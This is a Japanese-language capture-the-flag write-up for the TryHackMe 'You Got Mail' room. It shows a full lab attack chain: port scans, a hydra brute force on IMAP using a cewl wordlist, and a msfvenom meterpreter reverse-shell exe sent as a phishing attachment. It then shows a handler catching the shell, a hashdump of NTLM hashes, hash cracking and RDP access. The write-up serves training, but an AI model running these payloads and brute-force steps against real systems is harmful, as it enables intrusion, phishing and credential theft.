# You Got Mail CTF

https://tryhackme.com/room/yougotmail

## Enumeration

```shell
TARGET=10.10.222.181
sudo bash -c "echo $TARGET   dockmagic.thm >> /etc/hosts"
```

### ポートスキャン

```sh
$ rustscan -a $TARGET
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where scanning meets swagging. 😎

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.222.181:25
Open 10.10.222.181:110
Open 10.10.222.181:139
Open 10.10.222.181:135
Open 10.10.222.181:143
Open 10.10.222.181:445
Open 10.10.222.181:587
Open 10.10.222.181:3389
Open 10.10.222.181:5985
Open 10.10.222.181:7680
Open 10.10.222.181:47001
Open 10.10.222.181:49666
Open 10.10.222.181:49665
Open 10.10.222.181:49664
Open 10.10.222.181:49667
Open 10.10.222.181:49668
Open 10.10.222.181:49671
Open 10.10.222.181:49669
Open 10.10.222.181:49673
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-19 16:21 JST
Initiating Ping Scan at 16:21
Scanning 10.10.222.181 [4 ports]
Completed Ping Scan at 16:21, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:21
Completed Parallel DNS resolution of 1 host. at 16:21, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 16:21
Scanning 10.10.222.181 [19 ports]
Discovered open port 587/tcp on 10.10.222.181
Discovered open port 3389/tcp on 10.10.222.181
Discovered open port 110/tcp on 10.10.222.181
Discovered open port 445/tcp on 10.10.222.181
Discovered open port 135/tcp on 10.10.222.181
Discovered open port 139/tcp on 10.10.222.181
Discovered open port 49671/tcp on 10.10.222.181
Discovered open port 25/tcp on 10.10.222.181
Discovered open port 143/tcp on 10.10.222.181
Discovered open port 49668/tcp on 10.10.222.181
Discovered open port 49673/tcp on 10.10.222.181
Discovered open port 49667/tcp on 10.10.222.181
Discovered open port 47001/tcp on 10.10.222.181
Discovered open port 49664/tcp on 10.10.222.181
Discovered open port 49669/tcp on 10.10.222.181
Discovered open port 49666/tcp on 10.10.222.181
Discovered open port 7680/tcp on 10.10.222.181
Discovered open port 49665/tcp on 10.10.222.181
Discovered open port 5985/tcp on 10.10.222.181
Completed SYN Stealth Scan at 16:21, 0.53s elapsed (19 total ports)
Nmap scan report for 10.10.222.181
Host is up, received reset ttl 125 (0.25s latency).
Scanned at 2025-06-19 16:21:47 JST for 1s

PORT      STATE SERVICE       REASON
25/tcp    open  smtp          syn-ack ttl 125
110/tcp   open  pop3          syn-ack ttl 125
135/tcp   open  msrpc         syn-ack ttl 125
139/tcp   open  netbios-ssn   syn-ack ttl 125
143/tcp   open  imap          syn-ack ttl 125
445/tcp   open  microsoft-ds  syn-ack ttl 125
587/tcp   open  submission    syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125
5985/tcp  open  wsman         syn-ack ttl 125
7680/tcp  open  pando-pub     syn-ack ttl 125
47001/tcp open  winrm         syn-ack ttl 125
49664/tcp open  unknown       syn-ack ttl 125
49665/tcp open  unknown       syn-ack ttl 125
49666/tcp open  unknown       syn-ack ttl 125
49667/tcp open  unknown       syn-ack ttl 125
49668/tcp open  unknown       syn-ack ttl 125
49669/tcp open  unknown       syn-ack ttl 125
49671/tcp open  unknown       syn-ack ttl 125
49673/tcp open  unknown       syn-ack ttl 125

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.91 seconds
           Raw packets sent: 23 (988B) | Rcvd: 20 (876B)
```

nmap vuln

```sh
root@ip-10-10-227-58:~# sudo nmap -sV -p25,110,139,135,143,445,587,3389,5985,7680 --script vuln $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-19 08:37 BST
Nmap scan report for 10.10.222.181
Host is up (0.0011s latency).

PORT     STATE  SERVICE       VERSION
25/tcp   open   smtp          hMailServer smtpd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| smtp-vuln-cve2010-4344:
|_  The SMTP server is not Exim: NOT VULNERABLE
|_sslv2-drown:
110/tcp  open   pop3          hMailServer pop3d
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown:
135/tcp  open   msrpc         Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
143/tcp  open   imap          hMailServer imapd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown:
445/tcp  open   microsoft-ds?
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
587/tcp  open   smtp          hMailServer smtpd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| smtp-vuln-cve2010-4344:
|_  The SMTP server is not Exim: NOT VULNERABLE
|_sslv2-drown:
3389/tcp open   ms-wbt-server Microsoft Terminal Services
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown:
5985/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
7680/tcp closed pando-pub
MAC Address: 02:66:3C:C1:93:B7 (Unknown)
Service Info: Host: BRICK-MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.99 seconds
```

https://brownbrick.co/menu.html からユーザー名の候補を入手。

```
oaurelius@brownbrick.co
tchikondi@brownbrick.co
wrohit@brownbrick.co
pcathrine@brownbrick.co
lhedvig@brownbrick.co
fstamatis@brownbrick.co
```

imap に対して rockyou.txt でブルートフォースをかけてみたが、少し待ってあきらめた。

Web サイトから単語リストを作る。

```sh
$ cewl --lowercase https://brownbrick.co/ > passwords.txt
```

1 つのアドレスについて、有効なパスワードが見つかった。

```sh
$ hydra -L users.txt -P passwords.txt $TARGET imap -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-19 17:21:44
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 864 login tries (l:6/p:144), ~29 tries per task
[DATA] attacking imap://10.10.222.181:143/
[143][imap] host: 10.10.222.181   login: lhedvig@brownbrick.co   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-19 17:22:16
```

Thumderbird を設定して開いてみたが、受信メールはない。

メールの添付ファイルとして、全員に exe ファイルを送ってみた。

```sh
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.85.243 LPORT=4444 -f exe > shell.exe
```

meterpreter 取得成功！

```sh
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.13.85.243; set LPORT 4444;exploit"
Warning: KRB5CCNAME environment variable not supported - unsetting
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 10.13.85.243
LPORT => 4444
[*] Started reverse TCP handler on 10.13.85.243:4444
[*] Sending stage (177734 bytes) to 10.10.222.181
[*] Meterpreter session 1 opened (10.13.85.243:4444 -> 10.10.222.181:49797) at 2025-06-19 17:43:01 +0900

meterpreter > shell
Process 2080 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Mail\Attachments>whoami
whoami
brick-mail\wrohit
```

デスクトップにフラグがあった。

```sh
C:\Users\wrohit\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\wrohit\Desktop

03/11/2024  05:14 AM    <DIR>          .
03/11/2024  05:14 AM    <DIR>          ..
03/11/2024  05:15 AM                25 flag.txt
               1 File(s)             25 bytes
               2 Dir(s)  13,990,039,552 bytes free
```

hashdump

```sh
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dfe3378335d43f9764e581b856a662a:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
fstamatis:1009:aad3b435b51404eeaad3b435b51404ee:034c830cc313485a82e57a0d9dfa14e4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lhedvig:1010:aad3b435b51404eeaad3b435b51404ee:034c830cc313485a82e57a0d9dfa14e4:::
oaurelius:1011:aad3b435b51404eeaad3b435b51404ee:034c830cc313485a82e57a0d9dfa14e4:::
pcathrine:1012:aad3b435b51404eeaad3b435b51404ee:034c830cc313485a82e57a0d9dfa14e4:::
tchikondi:1013:aad3b435b51404eeaad3b435b51404ee:034c830cc313485a82e57a0d9dfa14e4:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
wrohit:1014:[REDACTED]:[REDACTED]:::
```

wrohit のパスワードは hashcat でクラックできた。

```sh
.\hashcat.exe -m 1000 hash.txt rockyou.txt
```

パスワードを使い、RDP で接続できるようになった。

## hMailServer

デスクトップのアプリアイコンは hMailServer ではない。`SquirrelMail version 1.4.22` が起動するが、まったく関係ない。

C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini に管理者パスワードの MD5 ハッシュが保存されている。

```
[Security]
AdministratorPassword=[REDACTED]
```

この MD5 ハッシュは、hashcat などでクラック可能。

終わり。

## 振り返り

- フィッシングメールを送って添付ファイルを開かせるパターンは初見で、おもしろかった。ルーム説明に `Test your recon and phishing skills` とあったから思いついたが、そうでなければ思いつかなかったと思う。
- Web サイトから単語リストを作るパターンは、いつも思いつきはするものの、面倒でなかなか実行しようと思えない作業。
